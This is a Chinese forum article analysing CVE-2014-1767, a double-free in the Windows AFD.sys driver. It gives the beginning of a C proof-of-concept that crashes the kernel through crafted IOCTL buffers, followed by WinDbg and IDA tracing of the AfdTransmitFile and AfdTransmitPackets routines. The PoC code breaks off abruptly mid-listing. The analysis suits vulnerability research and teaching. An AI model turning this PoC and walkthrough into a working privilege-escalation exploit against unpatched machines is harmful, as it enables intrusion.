#  万字长文详解CVE-2014-1767提权漏洞分析与利用（x86x64）   
yumoqaq  看雪学苑   2022-06-14 18:11  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8EXiaaJdNyYhHcc0b2FGBewUc2JHMQZ8pg1Er6vZxQy4V2wg5wDQ0TFvAtGBjKfGpQ4SKJgicqVsYLw/640?wx_fmt=jpeg "")  
  
本文为看雪论坛精华文章看雪论坛作者ID：yumoqaq  
  
  
这是我第一个研究的漏洞，虽然已经有相当多的资料与文章对这个漏洞进行了分析，但是大部分都是（ctrlCV你懂的），参考了前人的资料，给出了还不如前人的分析文章，让我这个纯纯的新手感觉到困难重重。所以我想把我的分析与思考的过程分享给大家，希望可以帮助到像我一样的菜鸟们，  
同时也是向那些无私奉献的大佬们致敬！  
  
# 概述  
  
  
在2014年的Pwn2Own黑客大赛上，Siberas安全团队利用CVE-2014-1767 Windows AFD.sys 双重释放漏洞进行内核提权，以此绕过windows8.1 平台上的IE11沙箱，随后该漏洞因此获得2014年黑客奥斯卡的“最佳提权漏洞奖”。  
  
  
# 影响版本  
```
Windows 8.1
Windows 8
Windows 7
Windows Vista
Windows XP
Windows Server 2012 R2
Windows Server 2012
Windows Server 2008 R2
Windows Server 2008
Windows Server 2003
Windows RT
Windows RT 8.1
```  
#   
#   
#   
# 实验环境  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EXiaaJdNyYhHcc0b2FGBewU2C65tT2SBfWnIZw2zBMK4JjI8IibXb1apEMp5bAsXzYkP7ecNu5TuyQ/640?wx_fmt=png "")  
  
  
# POC  
  
  
将以下代码编译，我使用VS2019，编译后在win7x86 SP1的虚拟机上运行，蓝屏崩溃。  
```
#include <stdio.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib,"Ws2_32.lib")
 
int main()
{
    DWORD targetSize = 0x310;
    DWORD virtualAddress = 0x13371337;
    DWORD mdlSize = (0x4000 * (targetSize - 0x30) / 8) - 0xFFF - (virtualAddress & 0xFFF);
    static DWORD inbuf1[100];
    memset(inbuf1, 0, sizeof(inbuf1));
    inbuf1[6] = virtualAddress;
    inbuf1[7] = mdlSize;
    inbuf1[10] = 1;
    static DWORD inbuf2[100];

2.afd.sys 是一个 winsock辅助驱动（百度可知）。  
  
   
  
3.POC中使用了一个初始化后的socket对象当作句柄，来调用到afd驱动中的例程，控制码为 0x1207F 与 0x120C3 （一般调用驱动的流程为通过符号链接来得到句柄，这里直接传入socket，应该是经过操作过后的socket句柄在内核对应的对象中与直接创建的设备句柄有些不同，不然没必要进行这一步操作）。  
  
   
  
4.调用堆栈中看出，通过nt!ZwDeviceIoControlFile 进入内核 ，调用到afd派遣例程afd!AfdDispatchDeviceControl ，然后调用到控制码对应的处理例程afd!AfdTransmitPackets ，之后触发蓝屏。  
  
   
  
5.既然是双重释放导致的蓝屏，那么BSOD中的调用堆栈应该为第二次触发free的堆栈。  
  
   
  
6.根据前五点得出的信息，想要得知poc的工作流程，首先得去 0x1207F 控制码的处理例程中去分析。  
  
   
  
7.想要得到 0x1207F 控制码的处理例程，根据调用堆栈，进行跟踪即可。  
#   
#   
# 0x1207F处理例程分析  
##   
## 1.双机调试  
  
  
在NtDeviceIoControlFile 函数下条件断点，IO控制码在第六个参数，也就是 esp+18 ，命令如下，之后使用wt命令即可跟踪调用堆栈（不建议 我卡死了）  
  
   
  
所以尝试在调用较少的函数处下断，例如afd!AfdReturnTpInfo，它会调用IoFreeMdl释放内存（查看IDA函数引用可得知，调用AfdReturnTpInfo的函数只有几个，所以可以尝试在这些函数下断，如果没成功定位（也就是两次释放的流程不同，不是都经过AfdReturnTpInfo）则可以逆向分析派遣例程中的控制码或者是使用wt命令追踪是比较稳妥的）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4otdoMvB6yHqmRlQicgyLVNR4mafvc3ENlic3kNZtj6ibd3fqIDvyTHg1A/640?wx_fmt=png "")  
```
0: kd> bp nt!NtDeviceIoControlFile ".if (poi(esp+18) = 0x1207F){}.else{gc;}"
0: kd> wt
```  
  
```
1: kd> bp afd!AfdReturnTpInfo
 
1: kd> g
Breakpoint 0 hit
afd!AfdReturnTpInfo:
94273e03 8bff            mov     edi,edi
 
2: kd> kb
# ChildEBP RetAddr  Args to Child             
00 9fee3a38 942578c1 875794b8 00000001 0bcaffe7 afd!AfdReturnTpInfo
01 9fee3aec 9425c2bc 8a17c958 88ba0938 9fee3b14 afd!AfdTransmitFile+0x5a3
02 9fee3afc 8463e593 88ba0938 89732418 89732418 afd!AfdDispatchDeviceControl+0x3b
03 9fee3b14 8483299f 8a17c958 89732418 897324f4 nt!IofCallDriver+0x63
04 9fee3b34 84835b71 88ba0938 8a17c958 00000000 nt!IopSynchronousServiceTail+0x1f8
05 9fee3bd0 8487c3f4 88ba0938 89732418 00000000 nt!IopXxxControlFile+0x6aa
06 9fee3c04 846451ea 00000050 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
07 9fee3c04 773a70b4 00000050 00000000 00000000 nt!KiFastCallEntry+0x12a
08 0014f8d8 773a5864 7556989d 00000050 00000000 ntdll!KiFastSystemCallRet
09 0014f8dc 7556989d 00000050 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc
 
 
2: kd> kb
# ChildEBP RetAddr  Args to Child             
00 9fee3a08 942568ac 875794b8 00000001 0bcaff4f afd!AfdReturnTpInfo
01 9fee3a44 94257bba 0bcaffe7 000120c3 94257a8c afd!AfdTliGetTpInfo+0x89
02 9fee3aec 9425c2bc 8a17c958 88ba0938 9fee3b14 afd!AfdTransmitPackets+0x12e
03 9fee3afc 8463e593 88ba0938 89732418 89732418 afd!AfdDispatchDeviceControl+0x3b
```  
  
  
好的，经过我们的推测后下断，并启动POC程序，成功断下，查看调用堆栈，可以看到，afd!AfdTransmitFile的调用。  
  
   
  
所以控制码 0x1207F对应的处理例程为 AfdTransmitFile。  
  
   
  
第二次g之后断下，查看堆栈，0x120C3 对应的处理例程就肯定是 AfdTransmitPackets 了。  
  
   
  
之后再g ，蓝屏 ，太好了 ，两次调用后蓝屏，正好对应poc的工作流程。  
##   
## 2.逆向分析AfdTransmitFile  
  
  
定位到两个关键的处理例程之后，开始进行逆向分析，把驱动文件拷出来，使用IDA加载符号后分析。  
  
   
  
AfdTransmitFile 的两个参数 ， 由于它是 fastcall ， 所以它的参数在 ecx与edx中， 根据资料得知，ecx为 PIrp，edx为PIoStackLocation（你也可以在派遣例程中逆向或者动态跟踪得到）。  
  
   
  
查看一下他们的结构，对于_IO_STACK_LOCATION ， 它的Parameters成员 对于不同的IRP处理例程有不同的定义 ，下边给出的结构体是对于DeviceIoControl时的定义。  
```
kd> dt _Irp
ntdll!_IRP
   +0x000 Type             : Int2B
   +0x002 Size             : Uint2B
   +0x004 MdlAddress       : Ptr32 _MDL
   +0x008 Flags            : Uint4B
   +0x00c AssociatedIrp    : <unnamed-tag>
   +0x010 ThreadListEntry  : _LIST_ENTRY
   +0x018 IoStatus         : _IO_STATUS_BLOCK
   +0x020 RequestorMode    : Char
   +0x021 PendingReturned  : UChar
   +0x022 StackCount       : Char
   +0x023 CurrentLocation  : Char
   +0x024 Cancel           : UChar
   +0x025 CancelIrql       : UChar
   +0x026 ApcEnvironment   : Char
   +0x027 AllocationFlags  : UChar
   +0x028 UserIosb         : Ptr32 _IO_STATUS_BLOCK
   +0x02c UserEvent        : Ptr32 _KEVENT
   +0x030 Overlay          : <unnamed-tag>
   +0x038 CancelRoutine    : Ptr32     void
   +0x03c UserBuffer       : Ptr32 Void
   +0x040 Tail             : <unnamed-tag>
 
dt _IO_STACK_LOCATION
ntdll!_IO_STACK_LOCATION
   +0x000 MajorFunction    : UChar
   +0x001 MinorFunction    : UChar
   +0x002 Flags            : UChar
   +0x003 Control          : UChar
   +0x004 Parameters       : <unnamed-tag>
 
          struct {
    0x4        ULONG  OutputBufferLength;
    0x8        ULONG POINTER_ALIGNMENT  InputBufferLength;
    0xC        ULONG POINTER_ALIGNMENT  IoControlCode;
    0x10        PVOID  Type3InputBuffer;
        } DeviceIoControl;
 
   +0x014 DeviceObject     : Ptr32 _DEVICE_OBJECT
   +0x018 FileObject       : Ptr32 _FILE_OBJECT
   +0x01c CompletionRoutine : Ptr32     long
   +0x020 Context          : Ptr32 Void
```  
  
  
然后在IDA中插入这两个结构体的定义，如下图输入名字，点击ok即可。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4Au0vaoJvIzY10x6lwnlM0dDOtkIqWOt8y80804U6zGmKpDJXwY1cFA/640?wx_fmt=png "")  
  
   
  
接下来可以开始正式的分析了，我使用汇编进行分析，可能篇幅会比较长。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4bcqhlL18JeAyOwT8miaYTXoM2LDicQeE4AR0PoQHFRtWJa9jAPz1hOsA/640?wx_fmt=png "")  
  
这里会有分支，通过判断FsContext的值，这个时候需要动态调一下 ， 查看程序走了哪个分支。  
```
1: kd> bp afd!AfdTransmitFile
 
1: kd> g
Breakpoint 0 hit
afd!AfdTransmitFile:
8db6c31e 6884000000      push    84h
 
1: kd> r edx
edx=89689b4c
 
1: kd> dt _IO_STACK_LOCATION 89689b4c
ntdll!_IO_STACK_LOCATION
   +0x018 FileObject       : 0x89a33ab0 _FILE_OBJECT
 
1: kd> dt _FILE_OBJECT 0x89a33ab0
ntdll!_FILE_OBJECT
   +0x00c FsContext        : 0x877fcbc0 Void
 
1: kd> dd 0x877fcbc0
877fcbc0  0004afd2 00000000 00000200 89a3f658
```  
  
  
这里得到AFD2 ， 明显与 1AFD不同， 所以这个跳转指令生效 ，继续分析。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4j2eN9xqGwzejK58yFvtNLRCuLviaTu4CnIb89icVeYmexvwtrcdDlP4Q/640?wx_fmt=png "")  
  
   
  
这里又有判断跳转，动态查看一下参数。  
```
dd 89689b4c+0x8
89689b54  00000030 0001207f 00d63390 8751c4a0
```  
  
  
这里得到30，所以跳转生效，继续分析，又遇到两个跳转。  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4IpPRm6H4IHU1ptM6WvEGgjw24a90a2jibjepr0X8eIPq4XB36AZicLRg/640?wx_fmt=png "")  
  
   
  
动态查看参数，确定流程。  
```
1: kd> r ecx
ecx=89689a70
 
1: kd> dt _IRP 89689a70
ntdll!_IRP
   +0x000 Type             : 0n6
   +0x002 Size             : 0x190
   +0x004 MdlAddress       : (null)
   +0x008 Flags            : 0x60000
   +0x00c AssociatedIrp    : <unnamed-tag>
   +0x010 ThreadListEntry  : _LIST_ENTRY [ 0x897fe7fc - 0x897fe7fc ]
   +0x018 IoStatus         : _IO_STATUS_BLOCK
   +0x020 RequestorMode    : 1 ''
```  
  
  
这里可以得到 mode值为1，所以跳转未生效 ，继续查看下一个跳转。  
```
1: kd> dt _IO_STACK_LOCATION 89689b4c
ntdll!_IO_STACK_LOCATION
   +0x000 MajorFunction    : 0xe ''
   +0x001 MinorFunction    : 0x1f ''
   +0x002 Flags            : 0x5 ''
   +0x003 Control          : 0 ''
   +0x004 Parameters       : <unnamed-tag>
 
1: kd> dd 89689b4c + 0x10
89689b5c  00d63390 8751c4a0 89a33ab0 00000000
```  
  
  
这里得到 eax+10 也就是 Type3InputBuffer的值 低4位为0 ， 所以跳转生效，继续分析。  
  
   
  
这里提一下，为什么说是判断是否4字节对齐，看后面调用的参数 ，根据微软的解释：ExRaiseDatatypeMisalignment 例程可用于结构化异常处理，为驱动程序处理 I/O 请求时发生的不对齐数据类型引发驱动程序确定的异常。  
  
   
  
好的，继续分析，这里又遇到跳转，可以单步到这个位置看一下这个全局变量的值 值为0x7FFF000。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8HoL8rWLfqC4l5ibczH6C2H4KfDgcTJMTochc39BQbGNWibOx8CdWESq9IdA5bjGBeItXQbPlt4O4ZQ/640?wx_fmt=png "")  
  
   
  
